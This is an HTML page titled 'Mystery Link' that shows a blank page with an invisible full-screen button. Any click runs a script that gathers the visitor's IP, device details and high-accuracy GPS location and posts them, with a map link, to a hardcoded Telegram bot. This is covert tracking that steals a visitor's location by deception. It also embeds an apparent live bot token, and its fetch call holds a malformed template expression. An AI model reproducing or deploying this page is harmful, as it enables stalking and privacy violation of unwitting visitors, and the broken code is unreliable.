<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mystery Link</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .mystery-link {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            cursor: pointer;
            background: transparent;
            border: none;
        }
        .hidden-content {
            opacity: 0;
            transition: opacity 0.3s;
            pointer-events: none;
        }
        .success-checkmark {
            width: 80px;
            height: 80px;
            margin: 0 auto;
        }
        .check-icon {
            width: 80px;
            height: 80px;
            position: relative;
            border-radius: 50%;
            box-sizing: content-box;
            border: 4px solid #4CAF50;
        }
        .check-icon .icon-line {
            height: 5px;
            background-color: #4CAF50;
            display: block;
            border-radius: 2px;
            position: absolute;
            z-index: 10;
        }
        .check-icon .icon-line.line-tip {
            top: 46px;
            left: 14px;
            width: 25px;
            transform: rotate(45deg);
            animation: icon-line-tip 0.75s;
        }
        .check-icon .icon-line.line-long {
            top: 38px;
            right: 8px;
            width: 47px;
            transform: rotate(-45deg);
            animation: icon-line-long 0.75s;
        }
        @keyframes icon-line-tip {
            0% { width: 0; left: 1px; top: 19px; }
            54% { width: 0; left: 1px; top: 19px; }
            70% { width: 50px; left: -8px; top: 37px; }
            84% { width: 17px; left: 21px; top: 48px; }
            100% { width: 25px; left: 14px; top: 45px; }
        }
        @keyframes icon-line-long {
            0% { width: 0; right: 46px; top: 54px; }
            65% { width: 0; right: 46px; top: 54px; }
            84% { width: 55px; right: 0px; top: 35px; }
            100% { width: 47px; right: 8px; top: 38px; }
        }
    </style>
</head>
<body class="bg-white">
    <!-- This appears to be a blank page but has the invisible clickable overlay -->
    <button id="mystery-btn" class="mystery-link"></button>
    
    <!-- Hidden content that appears after click -->
    <div id="hidden-content" class="hidden-content fixed inset-0 bg-white flex items-center justify-center p-4">
        <div class="text-center">
            <div id="loading" class="mb-6">
                <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500 mx-auto mb-4"></div>
                <p class="text-gray-700">Processing...</p>
            </div>
            
            <div id="success" class="hidden mb-6">
                <div class="success-checkmark mb-4">
                    <div class="check-icon">
                        <span class="icon-line line-tip"></span>
                        <span class="icon-line line-long"></span>
                    </div>
                </div>
                <p class="text-gray-700">Request completed</p>
            </div>
            
            <div id="error" class="hidden mb-6">
                <div class="bg-red-100 rounded-full p-3 mb-4 mx-auto w-max">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                </div>
                <p id="error-message" class="text-gray-700 mb-4">An error occurred</p>
                <button id="close-btn" class="bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-2 px-4 rounded">
                    Close
                </button>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const mysteryBtn = document.getElementById('mystery-btn');
            const hiddenContent = document.getElementById('hidden-content');
            const loadingDiv = document.getElementById('loading');
            const successDiv = document.getElementById('success');
            const errorDiv = document.getElementById('error');
            const errorMessage = document.getElementById('error-message');
            const closeBtn = document.getElementById('close-btn');
            
            mysteryBtn.addEventListener('click', processClick);
            closeBtn.addEventListener('click', resetPage);
            
            function resetPage() {
                hiddenContent.style.opacity = '0';
                setTimeout(() => {
                    loadingDiv.classList.remove('hidden');
                    successDiv.classList.add('hidden');
                    errorDiv.classList.add('hidden');
                }, 300);
            }
            
            async function processClick() {
                // Show processing state
                hiddenContent.style.opacity = '1';
                
                try {
                    // Get device information
                    const deviceInfo = {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        screenWidth: window.screen.width,
                        screenHeight: window.screen.height,
                        language: navigator.language,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        deviceMemory: navigator.deviceMemory || 'unknown',
                        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                        ip: await getIP()
                    };
                    
                    // Get location
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        });
                    });
                    
                    const location = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude || null,
                        altitudeAccuracy: position.coords.altitudeAccuracy || null,
                        heading: position.coords.heading || null,
                        speed: position.coords.speed || null
                    };
                    
                    // Prepare data to send
                    const data = {
                        device: deviceInfo,
                        location: location,
                        timestamp: new Date().toISOString(),
                        pageUrl: window.location.href
                    };
                    
                    // Replace with your actual Telegram bot token and chat ID
                    const botToken = '7622509761:AAFUfP0ZI5b4LfC1sEaG2ru-h6i0z3ki07g';
                    const chatId = '7770786327';
                    
                    // Format message for Telegram
                    const message = `
🌐 *New Visitor Data* 🌐
                        
📱 *Device Info:*
- IP: ${deviceInfo.ip}
- Platform: ${deviceInfo.platform}
- Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
- Language: ${deviceInfo.language}
                        
📍 *Location:*
- Latitude: ${location.latitude}
- Longitude: ${location.longitude}
- Accuracy: ${location.accuracy} meters
                        
🌍 [View on Map](https://www.google.com/maps?q=${location.latitude},${location.longitude})
                    `;
                    
                    // Send to Telegram bot
                    const response = await fetch(`https://api.telegram.org/bot${7622509761:AAFUfP0ZI5b4LfC1sEaG2ru-h6i0z3ki07g}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: 7770786327,
                            text: message,
                            parse_mode: 'Markdown',
                            disable_web_page_preview: false
                        })
                    });
                    
                    if (!response.ok) {
                        throw new Error('Failed to send to Telegram');
                    }
                    
                    // Show success
                    loadingDiv.classList.add('hidden');
                    successDiv.classList.remove('hidden');
                    
                } catch (error) {
                    console.error('Error:', error);
                    loadingDiv.classList.add('hidden');
                    errorDiv.classList.remove('hidden');
                    
                    if (error.code === error.PERMISSION_DENIED) {
                        errorMessage.textContent = 'Location access was denied.';
                    } else if (error.code === error.POSITION_UNAVAILABLE) {
                        errorMessage.textContent = 'Location information is unavailable.';
                    } else if (error.code === error.TIMEOUT) {
                        errorMessage.textContent = 'Request timed out.';
                    } else {
                        errorMessage.textContent = 'An error occurred.';
                    }
                }
            }
            
            async function getIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch {
                    return 'unknown';
                }
            }
        });
    </script>
</body>
</html>
